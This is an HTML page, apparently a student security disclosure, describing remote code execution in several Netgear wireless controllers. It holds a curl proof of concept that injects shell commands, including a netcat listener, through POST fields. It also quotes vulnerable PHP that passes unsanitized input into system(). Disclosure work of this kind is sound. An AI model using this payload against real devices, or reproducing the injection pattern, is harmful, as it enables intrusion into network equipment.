@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="generator" content="Hugo 0.26" />
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>alxndr</title>
+        <style>
+
+@font-face {
+    font-family: 'Linux Libertine';  
+    src: url('https://physics.bu.edu/~alxndr/fonts/LinLibertine_RI.woff') format('woff');
+    font-weight: normal;
+    font-style: italic;
+}
+
+@font-face {
+    font-family: 'Linux Libertine';  
+    src: url('https://physics.bu.edu/~alxndr/fonts/LinLibertine_RB.woff') format('woff');
+    font-weight: bold;
+    font-style: normal;
+}
+
+@font-face {
+    font-family: 'Linux Libertine';  
+    src: url('https://physics.bu.edu/~alxndr/fonts/LinLibertine_RBI.woff') format('woff');
+    font-weight: bold;
+    font-style: italic;
+}
+
+body{
+    line-height:1.6;
+    max-width:700px;
+    padding-left:10px;
+	margin: auto;
+	font-family: 'Verdana'
+}
+h1,h2,h3,h4{
+    line-height:1;
+    font-size: 1.2em;
+    
+    
+}
+h1{
+    line-height:1;
+    font-size: 1.2em;
+    color: #535F6D;
+    text-align: left;
+}
+a {
+    color: #0089ff;
+    text-decoration: none;
+    border-bottom: 1px solid rgba(0,137,255,.3); -webkit-transition: color .1s ease,border-color .1s ease;
+    transition: color .1s ease,border-color .1s ease;
+}
+a:hover {
+    color: #f41224 !important;
+    border-color: rgba(244,18,36,.3) !important;
+}
+a:visited{
+ 
+}
+.navcell{
+	padding-top:20px;
+    padding-right:20px;
+}
+.postdate{
+    padding-right:20px;
+}
+.postlink{
+    padding-right:20px;
+}
+.wrappedimg{
+    margin:10px;
+}
+
+.wiggly {
+    font-weight: bold;
+    display: inline-block;
+}
+
+        </style>
+    </head>
+    <body>
+        
+        <table style="margin-left:auto; margin-right:auto">
+            <tr>
+                <td class=navcell><a href=https://physics.bu.edu/~alxndr/>home</a></td>
+            </tr>
+        </table>
+        
+
+
+
+<h1>Remote Code Execution in Netgear WLAN Controllers</h1>
+
+<center>
+    <video width=90% controls>
+    <source src="wc7520.webm" type="video/mp4">
+    Your browser does not support the video tag.
+    </video>
+</center>
+## description
+While working on a static analysis toolkit for firmware images, our team 
+discovered a remote code execution vulnerability on several Netgear Wireless 
+Controller Devices. These devices provide a configuration interface via HTTP.
+One of the scripts in the webserver root is a "request_handler.php" which 
+passes unsanitized POST variables into a 
+[system()](http://php.net/manual/en/function.system.php) call. So far we 
+confirmed  that NETGEAR WC7500, WC7600, WC7620, WC9500 and WMS5316 devices 
+contain the vulnerable code. 
+<h2 id="reproducing-the-attack">reproducing the attack</h2>
+<p>This POST request demonstrates how two POST variables can be used for RCE</p>
+<pre tabindex="0"><code>curl --data &#34;forward_ip=\&#34;;ls /;#&#34; --data &#34;reqMethod=\&#34;;nc -lvp 44444;#&#34; http://VULNERABLE_HOST/request_handler.php
+</code></pre><h2 id="the-vulnerable-php-code">the vulnerable php code</h2>
+<pre tabindex="0"><code>request_handler.php:
+
+       session_start();
+        header(&#39;content-type: application/json&#39;);
+
+        $no_error = 0;
+        if($_POST[&#34;forward_ip&#34;] &amp;&amp; $_POST[&#34;forward_ip&#34;] != $_SERVER[&#34;SERVER_ADDR&#34;]) {
+            $post_data = array(&#34;reqMethod&#34; =&gt; stripslashes($_POST[&#34;reqMethod&#34;]),
+                               &#34;jsonData&#34;  =&gt; stripslashes($_POST[&#34;jsonData&#34;]));
+            if($_POST[&#34;no_error&#34;])
+               $no_error = 1;
+            $tmp = &#34;IP:&#34;.$_POST[&#34;forward_ip&#34;].&#34;Req Meth:&#34;.$post_data[&#34;reqMethod&#34;];
+            system(&#34;echo $tmp &gt;&gt; /tmp/jsonoutput.txt&#34;);
+            forwardRequest($_POST[&#34;forward_ip&#34;], $post_data, $no_error);
+        } else {
+            selfHandleRequest();
+        }
+</code></pre><h2 id="credits">credits</h2>
+<p>This work was done with Steven So, Muhammad Anas Imtiaz and Daniel Finn for
+Prof. Egele&rsquo;s Cybersecurity course</p>
+
+    </body>
+</html>
+
+
